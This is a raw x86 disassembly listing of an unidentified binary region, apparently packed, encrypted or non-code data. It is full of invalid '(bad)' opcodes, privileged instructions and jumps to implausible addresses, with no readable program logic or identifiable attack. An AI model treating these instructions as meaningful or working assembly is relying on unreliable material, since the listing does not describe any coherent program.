  415136:	cld    
  415137:	inc    eax
  415138:	add    ebx,DWORD PTR [edi+0x15e85973]
  41513e:	and    BYTE PTR [edx+0x28fcfd76],ch
  415144:	add    ebx,DWORD PTR [edi+0x15f08173]
  41514a:	adc    BYTE PTR [edx-0x75aef292],dl
  415150:	mov    dh,0x45
  415152:	fidiv  WORD PTR [esi]
  415154:	stos   DWORD PTR es:[edi],eax
  415155:	mov    al,BYTE PTR [ebx+0x49]
  415158:	ror    DWORD PTR es:0x102fd,0x75
  415160:	mov    ecx,0xa8742447
  415165:	test   esi,ebx
  415167:	jne    0x415114
  415169:	add    DWORD PTR [ebx-0x297a47d2],eax
  41516f:	jne    0x41511c
  415171:	add    DWORD PTR [ecx+0xd01a7c0],eax
  415177:	icebp  
  415178:	pop    esi
  415179:	add    al,0x0
  41517b:	jne    0x415140
  41517d:	scas   al,BYTE PTR es:[edi]
  41517e:	mov    al,0x74
  415180:	stos   DWORD PTR es:[edi],eax
  415181:	test   eax,eax
  415183:	jb     0x4151a4
  415185:	pop    ebp
  415186:	add    BYTE PTR [ebp-0x55],dh
  415189:	sahf   
  41518a:	xor    DWORD PTR [edx],edx
  41518c:	mov    ss,WORD PTR [ebp+0x10]
  415192:	add    BYTE PTR [eax],al
  415194:	mov    ch,0xab
  415196:	mov    al,al
  415198:	jb     0x4151b9
  41519a:	ins    DWORD PTR es:[edi],dx
  41519b:	add    BYTE PTR [ebp-0x55],dh
  41519e:	xor    eax,ebp
  4151a0:	mov    esp,0xfc0002d8
  4151a5:	add    DWORD PTR [ebx+edx*8-0x78113e09],ebp
  4151ac:	sti    
  4151ad:	add    edi,esp
  4151af:	add    ebp,DWORD PTR [ebx]
  4151b1:	xor    DWORD PTR [edx-0x25],esp
  4151b4:	pop    esp
  4151b5:	add    dl,BYTE PTR [edi-0x17975155]
  4151bb:	add    ebp,esp
  4151bd:	xchg   ecx,eax
  4151be:	pusha  
  4151bf:	sbb    DWORD PTR [ecx+0x7f],ebx
  4151c2:	xor    eax,0xdbed2b18
  4151c7:	xlat   BYTE PTR ds:[ebx]
  4151c8:	rol    BYTE PTR [edi+eiz*8-0x76],0x1e
  4151cd:	push   es
  4151ce:	mov    DWORD PTR fs:[ecx-0x69],ecx
  4151d2:	push   cs
  4151d3:	lahf   
  4151d4:	and    eax,0xbb84be99
  4151d9:	icebp  
  4151da:	test   BYTE PTR [ecx+0x75],0xc1
  4151de:	ins    BYTE PTR es:[edi],dx
  4151df:	fsubr  DWORD PTR [edi-0x68]
  4151e2:	out    dx,al
  4151e3:	add    dh,BYTE PTR [ebp+0x1]
  4151e6:	out    0x9e,eax
  4151e8:	xchg   BYTE PTR [edx],cl
  4151ea:	stc    
  4151eb:	inc    ebx
  4151ec:	jne    0x41526b
  4151ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151ef:	pop    ss
  4151f0:	mov    ch,0x8b
  4151f2:	fs scas eax,DWORD PTR es:[edi]
  4151f4:	dec    esi
  4151f5:	cwde   
  4151f6:	(bad)  
  4151f7:	fiadd  DWORD PTR [eax]
  4151f9:	add    BYTE PTR [eax],al
  4151fb:	add    BYTE PTR [eax],al
  4151fd:	ja     0x415245
  4151ff:	popf   
  415200:	inc    edx
  415201:	jne    0x415210
  415203:	stc    
  415204:	xchg   ebp,eax
  415205:	jbe    0x4151e9
  415207:	mov    WORD PTR [edx+0x75],es
  41520a:	repnz sbb al,BYTE PTR [esi]
  41520d:	fs dec ebp
  41520f:	and    DWORD PTR [eax-0x779b67e8],0x49
  415216:	xchg   ebp,eax
  415217:	mov    ds,WORD PTR [esi-0x7341685b]
  41521d:	(bad)  
  41521e:	sahf   
  41521f:	jl     0x4151bf
  415221:	clc    
  415222:	mov    edi,0x9cca6c00
  415227:	std    
  415228:	outs   dx,BYTE PTR ds:[esi]
  415229:	je     0x41522d
  41522b:	(bad)  
  41522c:	call   0xf8c94634
  415231:	add    al,BYTE PTR ss:[ebx+0x67f46d29]
  415238:	jmp    0xd3415533
  41523d:	jbe    0x4151d4
  41523f:	jae    0x415246
  415241:	fcmovbe st,st(1)
  415243:	cld    
  415244:	fmul   QWORD PTR [esi+0xbe93ff4]
  41524a:	adc    al,0x30
  41524c:	es popf 
  41524e:	add    edx,DWORD PTR [ecx]
  415250:	test   eax,0x625e3576
  415255:	cmp    eax,0xb42058e6
  41525a:	out    0xff,al
  41525c:	fwait
  41525d:	out    dx,eax
  41525e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41525f:	call   0x41533a
  415264:	add    BYTE PTR [eax],al
  415266:	es xchg edi,eax
  415268:	std    
  415269:	ins    DWORD PTR es:[edi],dx
  41526a:	adc    eax,DWORD PTR ss:0x4fe30b8c
  415271:	(bad)  
  415272:	mov    ah,0x2
  415274:	push   ecx
  415275:	aaa    
  415276:	in     al,dx
  415277:	adc    dl,BYTE PTR [esi+edi*1]
  41527a:	mov    edx,DWORD PTR [ebp+0x29cf973]
  415280:	std    
  415281:	cmp    al,0x71
  415283:	xchg   ebp,eax
  415284:	adc    edx,DWORD PTR ds:0x1f0040fb
  41528a:	adc    BYTE PTR [ebx],dl
  41528c:	adc    BYTE PTR [edx+0x9],ah
  41528f:	xchg   ebp,eax
  415290:	jae    0x415287
  415292:	add    DWORD PTR [ebx],edx
  415294:	or     BYTE PTR [esi+0x2ade4722],bl
  41529a:	jns    0x415225
  41529c:	fsub   DWORD PTR [eax+ebp*8+0xe]
  4152a0:	push   esp
  4152a1:	add    BYTE PTR [ecx-0x6eaf87a7],dl
  4152a7:	jo     0x41531d
  4152a9:	dec    esp
  4152aa:	pop    edi
  4152ab:	mov    eax,0x819373fd
  4152b0:	jns    0x4152c2
  4152b2:	int3   
  4152b3:	out    dx,al
  4152b4:	cmp    al,0xbe
  4152b6:	mov    al,ds:0x12003fc9
  4152bb:	jbe    0x4152ce
  4152bd:	sbb    dh,cl
  4152bf:	inc    edx
  4152c0:	add    dh,dh
  4152c2:	shl    DWORD PTR [esi-0x39],1
  4152c5:	inc    ebx
  4152c6:	int3   
  4152c7:	add    esi,DWORD PTR [ecx+0x25]
  4152ca:	add    BYTE PTR [eax],al
  4152cc:	add    BYTE PTR [eax],al
  4152ce:	add    BYTE PTR [esi+eiz*4+0x759c4076],dh
  4152d5:	adc    DWORD PTR [esi+ebx*4+0x42],edx
  4152d9:	add    BYTE PTR [ebp-0x74fb05b4],al
  4152df:	fs dec bp
  4152e2:	sbb    DWORD PTR [ebp-0x41fd18fe],0xc084c2
  4152ec:	(bad)  
  4152ed:	jle    0x4152fc
  4152ef:	js     0x4152bc
  4152f1:	aas    
  4152f2:	add    BYTE PTR [ebp-0x30],bl
  4152f5:	cli    
  4152f6:	adc    eax,0x3d9078
  4152fb:	fwait
  4152fc:	aam    0x86
  4152fe:	ret    
  4152ff:	xchg   ebp,edx
  415301:	rcl    DWORD PTR [eax],0x5c
  415304:	int    0x86
  415306:	in     al,dx
  415307:	pop    ebp
  415308:	rcl    DWORD PTR [ebp-0x75],cl
  41530b:	add    DWORD PTR [esi],0xbe51ff53
  415311:	adc    al,BYTE PTR [eax+0x1c]
  415314:	mov    DWORD PTR [ecx-0x4],eax
  415317:	mov    WORD PTR [esi-0x12357503],?
  41531d:	xor    ecx,DWORD PTR [edx-0x267a728b]
  415323:	adc    DWORD PTR [edi-0x18],0x8574eef4
  41532a:	fld    DWORD PTR [ecx-0x6e57854]
  415330:	jo     0x415347
  415332:	and    BYTE PTR [eax],al
  415334:	add    BYTE PTR [eax],al
  415336:	add    BYTE PTR [eax],al
  415338:	jp     0x41531f
  41533a:	add    al,0x16
  41533c:	jb     0x41539b
  41533e:	mov    eax,0x3aeb629
  415343:	inc    edx
  415344:	lea    esp,[edi+0x2bdc72f3]
  41534a:	xlat   BYTE PTR ds:[ebx]
  41534b:	inc    DWORD PTR [esi-0x6f]
  41534e:	inc    edx
  41534f:	mov    bl,BYTE PTR [ebp+ebx*2-0x7b]
  415353:	fldcw  WORD PTR [eax]
  415355:	cmc    
  415356:	iret   
  415357:	(bad)  
  415358:	lock loop 0x41536f
  41535b:	cmp    esi,ebp
  41535d:	popfw  
  41535f:	mov    esp,DWORD PTR [ecx-0x56]
  415362:	cmp    DWORD PTR [esi],0x39537650
  415368:	cmp    BYTE PTR [ebx-0x7d0af9eb],ah
  41536e:	pushf  
  41536f:	add    BYTE PTR es:[eax],dh
  415372:	mov    ?,WORD PTR [esp+esi*2-0x56]
  415376:	daa    
  415377:	es ret 
  415379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41537a:	repz imul eax,DWORD PTR [esi+0x358303eb],0x2e
  415382:	or     edx,DWORD PTR [esi+0x52]
  415385:	xchg   esi,eax
  415386:	mov    ebp,0xaeabb512
  41538b:	add    cl,BYTE PTR [esi+0x694b8d65]
  415391:	adc    al,BYTE PTR [ebx]
  415393:	mov    DWORD PTR [ebx],edi
  415395:	rol    BYTE PTR [esi],0x31
  415398:	xor    eax,0xc73d05
  41539d:	add    BYTE PTR [eax],al
  41539f:	add    BYTE PTR [eax],al
  4153a1:	aaa    
  4153a2:	add    ch,bh
  4153a4:	add    eax,esi
  4153a6:	mov    DWORD PTR [ebx+0x39d62187],ecx
  4153ac:	xor    ebx,DWORD PTR [edi+0x44332dd6]
  4153b2:	mov    ecx,0x31314174
  4153b7:	pop    ss
  4153b8:	fwait
  4153b9:	xchg   BYTE PTR [edx],dh
  4153bb:	fld    QWORD PTR [ebx+0x75]
  4153be:	shl    DWORD PTR [esi-0xc420bbc],1
  4153c4:	mov    WORD PTR [esi],?
  4153c6:	mov    edx,0x8ac94170
  4153cb:	lods   al,BYTE PTR ds:[esi]
  4153cc:	xchg   edi,eax
  4153cd:	(bad)  
  4153ce:	and    esi,DWORD PTR ds:[esp]
  4153d2:	xor    DWORD PTR [esi+0x11],eax
  4153d5:	ins    DWORD PTR es:[edi],dx
  4153d6:	mov    edi,DWORD PTR [edi+edi*4-0xe8d1150]
  4153dd:	push   0x2
  4153df:	les    esp,FWORD PTR fs:[esi]
  4153e2:	std    
  4153e3:	fadd   st,st(3)
  4153e5:	xchg   edx,eax
  4153e6:	dec    edi
  4153e7:	out    0x3,eax
  4153e9:	jne    0x415413
  4153eb:	div    DWORD PTR [ecx]
  4153ed:	popf   
  4153ee:	push   ds
  4153ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153f0:	add    al,0x75
  4153f2:	xchg   ebp,eax
  4153f3:	jl     0x4153a4
  4153f5:	in     al,dx
  4153f6:	ds pop ds
  4153f8:	lods   al,BYTE PTR ds:[esi]
  4153f9:	shl    dh,1
  4153fb:	out    0x3,eax
  4153fd:	repnz cld 
  4153ff:	mov    cl,0xc6
  415401:	jmp    0x4b26a8
  415406:	add    BYTE PTR [eax],al
  415408:	add    BYTE PTR [eax],al
  41540a:	in     al,dx
  41540b:	cmp    eax,0xe38d83d7
  415410:	pop    ebx
  415411:	cmovs  eax,DWORD PTR [esi-0x2d]
  415415:	call   0xc41:0x390092b6
  41541c:	int3   
  41541d:	mov    ?,WORD PTR [esi-0x429dff6a]
  415423:	mov    cs,WORD PTR [ebx-0x736c8ed3]
  415429:	cs jo  0x415405
  41542c:	rcl    BYTE PTR [esi*2+0x7582bfd1],0xaa
  415434:	sti    
  415435:	sub    bh,BYTE PTR [eax+0x2]
  415438:	xchg   DWORD PTR [edi],ebp
  41543a:	jne    0x415415
  41543c:	shl    ah,0x81
  41543f:	xchg   ebp,eax
  415440:	ss adc eax,0x13e8ff3f
  415447:	je     0x415446
  415449:	fsub   st(2),st
  41544b:	inc    edx
  41544c:	std    
  41544d:	aam    0xe6
  41544f:	xor    ch,al
  415451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415452:	mov    dl,BYTE PTR [ebx-0x699ab103]
  415458:	mov    DWORD PTR [edi+0x354b8aba],ebp
  41545e:	movups xmm7,xmm0
  415461:	fs push 0xa
  415464:	call   FWORD PTR [eax-0x17bc3432]
  41546a:	jbe    0x4153f5
  41546c:	inc    esi
  41546d:	in     eax,0x0
  41546f:	add    BYTE PTR [eax],al
  415471:	add    BYTE PTR [eax],al
  415473:	mov    ah,0x2
  415475:	sub    eax,0x87fe3462
  41547a:	in     eax,dx
  41547b:	ja     0x415406
  41547d:	inc    ebx
  41547e:	std    
  41547f:	aaa    
  415480:	jnp    0x4154c8
  415482:	icebp  
  415483:	xchg   esp,eax
  415484:	mov    DWORD PTR [ebx+0x15],eax
  415487:	xchg   esp,eax
  415488:	jnp    0x4154d0
  41548a:	(bad)  
  41548c:	shr    BYTE PTR ds:[edx+0x9],1
  415490:	add    DWORD PTR [edi+ebp*8-0x42],esi
  415494:	push   cs
  415495:	add    esp,DWORD PTR [ecx-0x71]
  415498:	add    al,0xe9
  41549a:	jecxz  0x4154d0
  41549c:	cmp    al,0xe
  41549e:	add    BYTE PTR [esi+0x66],cl
  4154a1:	add    al,0xc6
  4154a3:	pop    edx
  4154a4:	or     ch,bh
  4154a6:	scas   eax,DWORD PTR es:[edi]
  4154a7:	sbb    eax,0xcec956da
  4154ac:	add    DWORD PTR [eax],eax
  4154ae:	push   ebp
  4154af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154b0:	push   0x7f
  4154b2:	in     al,dx
  4154b3:	or     al,0xce
  4154b5:	push   ebp
  4154b6:	push   edi
  4154b7:	jecxz  0x4154bb
  4154b9:	or     BYTE PTR [ebp-0x24d09197],cl
  4154bf:	mov    edi,0x72ebe879
  4154c4:	jns    0x4154c1
  4154c6:	test   BYTE PTR [edx+esi*8],bl
  4154c9:	pusha  
  4154ca:	mov    ebx,DWORD PTR [ecx+0x544d8772]
  4154d0:	in     al,0x2a
  4154d2:	push   ebx
  4154d3:	inc    esp
  4154d4:	call   0x0:0xfefe
  4154db:	add    BYTE PTR [ecx-0x5bea047e],ch
  4154e1:	lea    edi,ds:0x74bd7700
  4154e7:	cmp    al,0x74
  4154e9:	(bad)  
  4154ea:	cld    
  4154eb:	jae    0x415498
  4154ed:	into   
  4154ee:	jle    0x4154b8
  4154f0:	push   ebx
  4154f1:	data16 jae 0x41551f
  4154f4:	(bad)  
  4154f5:	inc    BYTE PTR [esi+0x746d97f0]
  4154fb:	sub    ah,dh
  4154fd:	(bad)  
  4154fe:	dec    DWORD PTR [edi]
  415500:	mov    ebp,cs
  415502:	dec    esi
  415503:	push   esi
  415504:	jae    0x4154a9
  415506:	mov    cl,0x13
  415508:	sbb    al,0x6
  41550a:	add    eax,0x685395e9
  415510:	jne    0x41558b
  415512:	add    BYTE PTR [eax],al
  415514:	iret   
  415515:	mov    ebp,0x9da7e8fb
  41551a:	(bad)  
  41551b:	push   DWORD PTR [ebp+0x24]
  41551e:	cdq    
  41551f:	push   esi
  415520:	dec    ebp
  415521:	icebp  
  415522:	inc    edx
  415523:	(bad)  
  415524:	cmp    cl,cl
  415526:	push   cs
  415527:	lock sbb eax,0x2aff42e9
  41552d:	pop    ecx
  41552e:	push   cs
  41552f:	hlt    
  415530:	or     eax,0x1aff44a1
  415535:	adc    eax,0x44b35dc0
  41553a:	leave  
  41553b:	ret    0x9b71
  41553e:	das    
  41553f:	mov    DWORD PTR [eax],eax
  415541:	add    BYTE PTR [eax],al
  415543:	add    BYTE PTR [eax],al
  415545:	add    eax,0x803bd71c
  41554a:	call   0xff0e:0xc0b3803f
  415551:	xor    al,dh
  415553:	xchg   esi,eax
  415554:	je     0x4154ef
  415556:	scas   eax,DWORD PTR es:[edi]
  415557:	das    
  415558:	std    
  415559:	sub    BYTE PTR [ebx-0xc],0x3f
  41555d:	jne    0x415585
  41555f:	shl    DWORD PTR [ebx+0x6a],0x25
  415563:	std    
  415564:	cmp    eax,0x140cdbf9
  415569:	jns    0x415566
  41556b:	movups xmm6,XMMWORD PTR [ecx-0x6e]
  41556f:	adc    eax,DWORD PTR [ecx+ebp*2]
  415572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415573:	invd   
  415575:	popa   
  415576:	mov    eax,ds:0xb859040d
  41557b:	push   cs
  41557c:	add    al,0xc5
  41557e:	call   0xc236:0xdb4702ac
  415585:	jns    0x415522
  415587:	mov    DWORD PTR cs:[ecx-0x59ef5ae4],ecx
  41558e:	shr    BYTE PTR [edi],cl
  415590:	xor    DWORD PTR [edx+0x22],ebp
  415593:	inc    esi
  415594:	hlt    
  415595:	in     eax,dx
  415596:	ins    DWORD PTR es:[edi],dx
  415597:	xchg   edi,eax
  415598:	xchg   eax,ebx
  41559a:	add    dl,bh
  41559c:	lea    edi,[esi+0x7d49208a]
  4155a2:	add    DWORD PTR [ebp-0x32],ebp
  4155a5:	inc    ebx
  4155a6:	xchg   ecx,eax
  4155a7:	out    0x2d,eax
  4155a9:	add    BYTE PTR [eax],al
  4155ab:	add    BYTE PTR [eax],al
  4155ad:	add    BYTE PTR [esp+eax*1-0x6],cl
  4155b1:	int3   
  4155b2:	push   0x3f
  4155b4:	mov    bl,0x10
  4155b6:	jnp    0x41553a
  4155b8:	repz mul BYTE PTR [eax+0x17]
  4155bc:	fist   WORD PTR [esi+0x99096ae]
  4155c2:	adc    dl,BYTE PTR [ecx-0xebe7719]
  4155c8:	pusha  
  4155c9:	(bad)  
  4155ca:	ds into 
  4155cc:	fld    QWORD PTR [eax+0x3e701ce]
  4155d2:	cld    
  4155d3:	inc    esi
  4155d4:	jae    0x41556d
  4155d6:	ss xchg esi,eax
  4155d8:	ins    BYTE PTR es:[edi],dx
  4155d9:	les    esi,FWORD PTR [eax-0x79]
  4155dc:	jns    0x4155e2
  4155de:	jne    0x4155e2
  4155e0:	jb     0x4155f3
  4155e2:	jge    0x4155c1
  4155e4:	push   ebp
  4155e5:	test   BYTE PTR [esi-0x70],cl
  4155e8:	out    0x88,eax
  4155ea:	cmp    ecx,esi
  4155ec:	out    0xf,eax
  4155ee:	mov    al,BYTE PTR [ebp-0x777e00bb]
  4155f4:	and    DWORD PTR [esi*2+0x51dc6702],eax
  4155fb:	add    DWORD PTR [ebp+esi*4+0x75],esp
  4155ff:	add    ah,bh
  415601:	sub    edi,ebp
  415603:	pop    ss
  415604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415605:	add    ebx,DWORD PTR [edi]
  415607:	or     BYTE PTR [edi+0xdcb8d36],ah
  41560d:	xchg   edi,eax
  41560e:	js     0x415595
  415610:	daa    
  415611:	pop    es
  415612:	add    BYTE PTR [eax],al
  415614:	add    BYTE PTR [eax],al
  415616:	add    cl,bh
  415618:	dec    ebx
  415619:	out    0x3,eax
  41561b:	jne    0x4155e5
  41561d:	add    BYTE PTR [eax+ecx*1+0x713be703],ch
  415624:	add    al,BYTE PTR [eax]
  415626:	push   ebx
  415627:	push   ebx
  415628:	das    
  415629:	cmp    esi,edx
  41562b:	js     0x415622
  41562d:	addr16 popa 
  41562f:	jo     0x415673
  415631:	add    cl,al
  415633:	ds (bad) 
  415635:	std    
  415636:	(bad)  
  415637:	mov    dl,0xc2
  415639:	je     0x41562b
  41563b:	call   0xd22a5483
  415640:	jbe    0x415642
  415642:	jmp    0xa6851ebd
  415647:	jbe    0x415646
  415649:	mov    ch,0x24
  41564b:	loop   0x41564a
  41564d:	mov    ch,0x51
  41564f:	data16 sbb BYTE PTR [eax-0x17],al
  415653:	pop    ds
  415654:	xchg   edi,eax
  415655:	jbe    0x415635
  415657:	or     edx,edi
  415659:	sbb    BYTE PTR [ecx],0xb6
  41565c:	inc    ecx
  41565d:	add    BYTE PTR [edx+0x35],ah
  415660:	xchg   edx,eax
  415661:	mov    esp,DWORD PTR ds:0x4ce590d9
  415667:	call   0xb6a753f9
  41566c:	adc    ecx,DWORD PTR [ecx]
  41566e:	push   edi
  41566f:	xor    eax,0xe3cc808d
  415674:	(bad)  
  415675:	jno    0x41568f
  415677:	fild   QWORD PTR ds:0x770d
  41567d:	add    BYTE PTR [eax],al
  41567f:	add    BYTE PTR ds:0x8a698a8d,dh
  415685:	sbb    BYTE PTR [eax-0x17],al
  415688:	iret   
  415689:	cmp    al,0x37
  41568b:	mov    ah,0x2
  41568d:	adc    al,0x4e
  41568f:	imul   ebp,DWORD PTR [ebp-0x70],0xce2e9c00
  415696:	or     dl,BYTE PTR [ebp+0x9ce3a]
  41569c:	lock inc ebx
  41569e:	cmp    al,0x9
  4156a0:	loopne 0x415659
  4156a2:	cmp    DWORD PTR [esi],esp
  4156a4:	loope  0x415640
  4156a6:	mov    BYTE PTR [ebp+0x54],al
  4156a9:	pushf  
  4156aa:	les    eax,FWORD PTR [ebx+0x23738f54]
  4156b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156b1:	(bad)  
  4156b2:	gs nop
  4156b4:	mov    ds:0x908d0046,al
  4156b9:	xchg   ebp,eax
  4156ba:	dec    BYTE PTR [edi+0x3b]
  4156bd:	lahf   
  4156be:	lods   eax,DWORD PTR ds:[esi]
  4156bf:	adc    ebx,DWORD PTR [esi+eax*1-0x7f]
  4156c3:	shl    BYTE PTR [ecx+0x7],0x87
  4156c7:	inc    ebp
  4156c8:	in     al,0x80
  4156ca:	inc    ecx
  4156cb:	lock and DWORD PTR [ebp+0x4],ecx
  4156cf:	sbb    BYTE PTR [edx+ebx*2],bh
  4156d2:	or     BYTE PTR [edx-0x7b685ee],cl
  4156d8:	xchg   esp,eax
  4156d9:	add    dl,BYTE PTR ds:0x876ea1ff
  4156df:	jge    0x41574d
  4156e1:	int    0x84
  4156e3:	jge    0x4156e5
  4156e5:	add    BYTE PTR [eax],al
  4156e7:	add    BYTE PTR [eax],al
  4156e9:	pop    esp
  4156ea:	test   eax,0x80bb087a
  4156ef:	into   
  4156f0:	(bad)  
  4156f1:	pop    ebx
  4156f2:	jne    0x415752
  4156f4:	mov    edx,DWORD PTR [ecx]
  4156f6:	imul   esp,DWORD PTR [edi],0xffffffc7
  4156f9:	iret   
  4156fa:	iret   
  4156fb:	pop    es
  4156fc:	pop    edi
  4156fd:	xchg   ebp,eax
  4156fe:	les    eax,FWORD PTR [eax+eax*1]
  415701:	adc    bh,BYTE PTR [edx-0x10]
  415704:	push   edi
  415705:	scas   eax,DWORD PTR es:[edi]
  415706:	ret    0xff2f
  415709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41570a:	into   
  41570b:	and    edx,DWORD PTR [eax]
  41570d:	mov    ebx,0x9c00830c
  415712:	add    cl,BYTE PTR [edi-0x75]
  415715:	fsubr  DWORD PTR [esi-0x5a8a75f3]
  41571b:	add    al,0x80
  41571d:	jl     0x4156d7
  41571f:	push   cs
  415720:	push   es
  415721:	cmp    esp,DWORD PTR [eax-0x7aa1d72f]
  415727:	xor    edi,0x800708a5
  41572d:	pop    esp
  41572e:	dec    edi
  41572f:	or     eax,0xe3a2f503
  415734:	jb     0x41579f
  415736:	sbb    ebx,DWORD PTR [edx-0x7e6139c1]
  41573c:	idiv   DWORD PTR [esp+esi*1-0xe]
  415740:	mov    al,ah
  415742:	jle    0x4156c5
  415744:	cli    
  415745:	jo     0x41571b
  415747:	cld    
  415748:	jg     0x415766
  41574a:	cmc    
  41574b:	or     al,0x3
  41574d:	add    BYTE PTR [eax],al
  41574f:	add    BYTE PTR [eax],al
  415751:	add    ch,dh
  415753:	push   edx
  415754:	pop    ss
  415755:	jbe    0x4157a3
  415757:	adc    DWORD PTR [edx-0x7e57e040],esi
  41575d:	fbstp  TBYTE PTR [edx+0x1b]
  415760:	xchg   edi,eax
  415761:	pop    es
  415762:	push   0x1d
  415764:	sar    dh,0xbe
  415767:	sbb    esp,DWORD PTR [eax-0x2ea70afb]
  41576d:	add    DWORD PTR [edi+0x6a079a1b],edi
  415773:	cmp    eax,0x1bbffebf
  415778:	lahf   
  415779:	add    eax,0xc5d0d9f5
  41577e:	jns    0x41576b
  415780:	fadd   QWORD PTR [ecx]
  415782:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415783:	and    esi,DWORD PTR ds:0x2d137430
  415789:	xor    BYTE PTR [edi+0x18],dh
  41578c:	rol    DWORD PTR [edx],0x8e
  41578f:	cwde   
  415790:	mov    DWORD PTR [eiz*2+0x11394164],ecx
  415797:	add    cl,bl
  415799:	out    dx,eax
  41579a:	jns    0x41571c
  41579c:	mov    ds:0xb28d8094,al
  4157a1:	xor    al,0xb3
  4157a3:	push   es
  4157a4:	in     eax,0x3
  4157a6:	rol    eax,cl
  4157a8:	out    dx,eax
  4157a9:	add    edi,esp
  4157ab:	inc    ebp
  4157ac:	ret    
  4157ad:	or     ecx,esp
  4157af:	ret    0x43ea
  4157b2:	ret    
  4157b3:	push   ss
  4157b4:	retf   
  4157b5:	stos   DWORD PTR es:[edi],eax
  4157b6:	add    BYTE PTR [eax],al
  4157b8:	add    BYTE PTR [eax],al
  4157ba:	add    BYTE PTR [edi],bl
  4157bc:	inc    edx
  4157bd:	call   0x64d353c5
  4157c2:	call   0xfe91:0x18d5f3c9
  4157c9:	int    0x18
  4157cb:	pop    ecx
  4157cc:	dec    dh
  4157ce:	iret   
  4157cf:	sub    DWORD PTR [ebp-0x66c48042],ecx
  4157d5:	jmp    0xa96d32b0
  4157da:	cld    
  4157db:	adc    dh,BYTE PTR [esi]
  4157dd:	jb     0x41577f
  4157df:	hlt    
  4157e0:	popf   
  4157e1:	jmp    0x415769
  4157e3:	jle    0x4157d7
  4157e5:	jmp    0xf1f4:0x148d6b19
  4157ec:	imul   BYTE PTR [edx+0x7002aaf6]
  4157f2:	dec    ecx
  4157f3:	loope  0x41578d
  4157f5:	jmp    0x41577d
  4157f7:	push   esi
  4157f8:	mov    fs,edi
  4157fa:	jle    0x415832
  4157fc:	cli    
  4157fd:	jno    0x415840
  4157ff:	jns    0x415832
  415801:	mov    ch,0x80
  415803:	mov    edx,edi
  415805:	popa   
  415806:	inc    ecx
  415807:	popa   
  415808:	or     DWORD PTR [eax],0x9ea9fc04
  41580e:	jl     0x41585e
  415810:	mov    al,BYTE PTR [edx]
  415812:	retf   0x3f24
  415815:	add    BYTE PTR [edx+0x41f808f5],bl
  41581b:	cld    
  41581c:	fdiv   st(6),st
  41581e:	call   0x415823
  415823:	add    BYTE PTR [ebx],cl
  415825:	mov    dh,BYTE PTR [ecx]
  415827:	cmp    esi,DWORD PTR [edx-0x54538b76]
  41582d:	daa    
  41582e:	or     BYTE PTR [ecx+ebp*2-0x7d26ad2b],dl
  415835:	aaa    
  415836:	cmp    DWORD PTR [esi+eiz*2-0x73],0x7f3ae71
  41583e:	adc    bl,ch
  415840:	push   0xffffffcb
  415842:	cmp    BYTE PTR [ebp+eiz*8+0x14],ah
  415846:	sbb    bl,dh
  415848:	pop    ebp
  415849:	mov    ss,WORD PTR [ecx-0x2a]
  41584c:	pop    ebp
  41584d:	repnz cld 
  41584f:	hlt    
  415850:	(bad)  
  415851:	icebp  
  415852:	aas    
  415853:	jmp    0xf0b51b55
  415858:	mov    ds:0x2a69fc3f,eax
  41585d:	add    edi,DWORD PTR [edx]
  41585f:	xor    eax,0xa15b7964
  415864:	cmp    ebp,DWORD PTR [esi+0x4c2b5a72]
  41586a:	pop    ebp
  41586b:	aaa    
  41586c:	dec    edx
  41586d:	ret    
  41586e:	ret    0x76f9
  415871:	cmp    DWORD PTR [ebx-0x27],0x72ef0f73
  415878:	sub    eax,0xdd24898a
  41587d:	(bad)  
  41587f:	pusha  
  415880:	test   eax,0x7274e59a
  415885:	in     eax,dx
  415886:	mov    BYTE PTR [edx+0x0],bl
  415889:	add    BYTE PTR [eax],al
  41588b:	add    BYTE PTR [eax],al
  41588d:	mov    bl,0xb3
  41588f:	jno    0x4158c6
  415891:	cmp    ah,bh
  415893:	jg     0x4158e5
  415895:	xchg   esi,eax
  415896:	(bad)  
  415898:	add    BYTE PTR [esi+edi*2],bl
  41589b:	add    eax,0xf57f937c
  4158a0:	or     eax,0xfa808de3
  4158a5:	sahf   
  4158a6:	hlt    
  4158a7:	add    ecx,DWORD PTR [ecx+0x42f40ae8]
  4158ad:	fidivr DWORD PTR [ebp+ebp*8-0x57b938e]
  4158b4:	add    cl,BYTE PTR [esi]
  4158b6:	sub    BYTE PTR [edi+0x7d],bh
  4158b9:	dec    esp
  4158ba:	push   DWORD PTR [ebx+0x1b]
  4158bd:	iret   
  4158be:	repnz vmrun 
  4158c2:	mov    eax,DWORD PTR [eax+0x71052c7d]
  4158c8:	adc    al,bh
  4158ca:	fcomi  st,st(7)
  4158cc:	inc    ebx
  4158cd:	daa    
  4158ce:	add    al,BYTE PTR [edi+0x410d185d]
  4158d4:	clc    
  4158d5:	pop    edi
  4158d6:	ins    DWORD PTR es:[edi],dx
  4158d7:	dec    DWORD PTR [edx+0x4d876a59]
  4158dd:	dec    eax
  4158de:	scas   al,BYTE PTR es:[edi]
  4158df:	ror    BYTE PTR [ecx-0x72e491f3],0x30
  4158e6:	xchg   edx,eax
  4158e7:	mov    bl,BYTE PTR [edi+ebx*1+0x0]
  4158eb:	mov    al,BYTE PTR [ebx]
  4158ed:	and    BYTE PTR [edi+0x871],bl
  4158f3:	add    BYTE PTR [eax],al
  4158f5:	add    BYTE PTR [eax],ah
  4158f7:	mov    BYTE PTR [ecx+0x7],bh
  4158fa:	ror    BYTE PTR [ebx+0x6d9f037c],0xeb
  415901:	mov    ebx,DWORD PTR [ecx+0x55cb288a]
  415907:	mov    cs,WORD PTR [eax-0x5280a3d]
  41590d:	call   DWORD PTR [ebx-0x2d]
  415910:	xchg   ah,ch
  415912:	std    
  415913:	iret   
  415914:	push   ebp
  415915:	push   edi
  415916:	jne    0x41594c
  415918:	adc    eax,0xc595b210
  41591d:	adc    dh,BYTE PTR ds:0x6d737c99
  415923:	adc    al,BYTE PTR [ebp-0x8]
  415926:	out    dx,al
